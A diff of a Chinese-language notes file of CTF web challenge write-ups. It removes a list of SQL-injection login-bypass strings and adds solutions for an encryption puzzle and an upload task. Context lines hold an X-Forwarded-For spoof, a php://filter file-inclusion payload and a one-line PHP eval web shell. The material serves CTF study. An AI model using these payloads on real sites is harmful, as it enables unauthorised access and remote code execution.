@@ -30,7 +30,7 @@
 	http://123.206.87.240:8002/web3/
 	直接查看源码，得&#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;
 	&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125;
-	扔到Burp 解码试试，解为html得flag
+	扔到 Burp 解码试试，解为html得flag
 
 7.域名解析
 	听说把 flag.bugku.com 解析到123.206.87.240 就能拿到flag
@@ -40,7 +40,7 @@
 	
 8.你必须让他停下
 	http://123.206.87.240:8002/web12/
-	页面不断的自动刷新，用Burp拦截，一张图一张图看，源代码中蕴含了flag
+	页面不断的自动刷新，用Burp拦截，一张图一张图看，源代码中蕴含了 flag
 	
 9.本地包含
 	<?php 
@@ -113,7 +113,7 @@
 13.网站被黑
 	http://123.206.87.240:8002/webshell/
 	这个题没技术含量但是实战中经常遇到
-	扫一下后台，找到后门，Burp爆破就看到了
+	扫一下后台，找到后门，Burp 爆破就看到了
 	
 14.管理员系统
 	特别突出的是 非本地IP访问，直接改个 X-Forwarded-For:127.0.0.1，然后再爆破
@@ -715,62 +715,6 @@
 	
 	
 // 一定要养成手动保存的好习惯，东西丢了还是很伤心的，又要重写
-	
-	万能密码：
-		
-		-------asp万能密码----
-	 
-	      'or'='or'
-
-	 
-		--------aspx万能密码------
-	 
-	   1： "or "a"="a
-	   2： ')or('a'='a
-	   3：or 1=1--
-	   4：'or 1=1--
-	   5：a'or' 1=1--
-	   6： "or 1=1--
-	   7：'or'a'='a
-	   8： "or"="a'='a
-	   9：'or''='
-	   10：'or'='or'
-	   11: 1 or '1'='1'=1
-	   12: 1 or '1'='1' or 1=1
-	   13: 'OR 1=1%00
-	   14: "or 1=1%00
-	   15: 'xor
-	   16: 新型万能登陆密码
-
-	   用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）
-	   密码 1
-	   Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
-	   Password=1
-
-	 
-	   17..admin' or 'a'='a 密码随便
-
-
-		--------PHP万能密码--------
-	 
-	   'or'='or'
-	  
-	   'or 1=1/*  字符型 GPC是否开都可以使用
-
-	 
-	   User: something
-	   Pass: ' OR '1'='1
-
-	 
-		--------jsp 万能密码------
-
-	   1'or'1'='1
-
-	   admin' OR 1=1/*
-	 
-	   用户名：admin    系统存在这个用户的时候 才用得上
-	   密码：1'or'1'='1
-
 
 # cookies欺骗
 	得到这么一个字符串：
@@ -798,7 +742,6 @@
 	
 # flag在index里
 	http://123.206.87.240:8005/post/index.php?file=show.php
-	大佬说这是明显的文件包含漏洞，试试 php:\\filter 伪协议
 	既然说flag在index里，看一下index源码，?file=php://filter/read=convert.base64-encode/resource=index.php
 	PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==
 	
@@ -922,7 +865,7 @@
 
 	
 # 细心
-	出现一个假的404页面，源代码里面也啥都没有，尝试扫扫后台，发现robots.txt
+	出现一个假的404页面，源代码里面也啥都没有，尝试扫扫后台，发现 robots.txt
 	打开它，发现一个 resusl.php 文件，再进去看一下，提示 _GET['x'] == password
 	提交 x = admin ，结果真中了，如果还没出来，只能想办法爆破了
 	
@@ -1026,3 +969,129 @@
 	还有个思路，传马之后，菜刀连接，此处不用改后缀名也能解析？？
 	// 一句话木马
 	<script language=php>eval($_POST['A'])</script>
+
+
+# PHP_incrypt_1
+	fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=
+
+	<?php
+	function encrypt($data,$key) {
+		$key = md5('ISCC');
+		$x = 0;
+		$len = strlen($data);
+		$klen = strlen($key);
+		for ($i=0; $i < $len; $i++) { 
+			/*
+			if ($x == $klen) {
+				$x = 0;
+			}*/
+			$char .= $key[$x % $klen];
+			$x += 1;
+		}
+		for ($i=0; $i < $len; $i++) {
+			// $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
+			$str .= chr((ord($data[$i]+ $key[$i % $klen]) % 128);
+			// chr 字符，ord ASCII码
+		}
+		return base64_encode($str);
+	}
+	?>
+
+	import hashlib
+	import base64
+
+	key = hashlib.md5("ISCC".encode('utf-8')).hexdigest()
+	base_64 = "fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="
+	base_64 = base64.b64decode(base_64)
+	data_len = len(base_64)
+
+	str_ = ""
+	for i in range(len(base_64)):
+		str_ += chr((base_64[i]-ord(key[i%len(key)]))%128)  # 这个题有点水
+	print(str_)
+
+# 文件上传2(湖湘杯)
+	这个题有点坑，我把源码都弄下来后仔细的看能不能绕过，结果看下别人的wp，直接有一个flag.php，我之前没扫出来。
+	这教会了我一个道理，先扫flag，flag.php已加入字典，以后就能扫出来了。
+	
+	下面的安全性已经非常高了，后缀被控死
+	upload.php
+
+	<?php
+	include 'common.php';
+
+	if(isset($_POST['submit']) && isset($_FILES['image'])) {
+		$fn = $_FILES['image']['tmp_name'];     // 存储在服务器的文件的临时副本的名称
+		$ft = $_FILES['image']['type'];         // 上传文件的类型
+
+		if(!is_uploaded_file($fn)) {  // 判断指定的文件是否是通过 HTTP POST 上传的。
+			fatal('uploaded file corrupted');
+		}
+
+		$array = array('image/png');
+		if(!in_array($ft,$array)){
+			fatal("Sorry, only PNG files are allowed.");
+		}
+
+		$imagekey = create_image_key();
+
+		move_uploaded_file($fn, "uploads/$imagekey.png");
+
+		header("Location: ?op=show&imagekey=$imagekey");
+	?>
+
+
+	show.php
+
+	<?php
+	include 'common.php';
+
+	if(empty($_GET['imagekey'])) {
+		header('Location: ?op=home');
+		exit();
+	}
+
+	$imagekey = $_GET['imagekey'];
+	$im = load_image($imagekey);
+
+	$w = imagesx($im);
+	$h = imagesy($im);
+	if($w > MAX_IM_SIZE || $h > MAX_IM_SIZE)
+		fatal("Invalid image dimensions.");
+	?>
+	<center>
+	<div class="article">
+		<h2></h2>
+		<p><img src="uploads/<?=$imagekey;?>.png" />
+		<div>
+			<a href="uploads/<?=$imagekey;?>.png">View saved image</a>
+		</div>
+	</div>
+	</center> 
+
+
+	common.php
+
+	<?php
+	if(!defined('FROM_INDEX')) die();
+
+	define('MAX_IM_SIZE', 100);
+
+	function create_image_key() {
+		return sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());
+	}
+
+	function load_image($imagekey) {
+		if(1 !== preg_match('/[0-9a-f]{40}/', $imagekey)) {
+			fatal('Invalid image key.');
+			// imagekey=9f6703af622b96dc1a4d01b889587f1ee3fc88d7
+		}
+
+		$im = imagecreatefrompng("uploads/{$imagekey}.png");
+		if(!$im) {
+			fatal('Failed to load image.');
+		}
+		return $im;
+	}
+	stream_wrapper_unregister ("zip");
+	?>
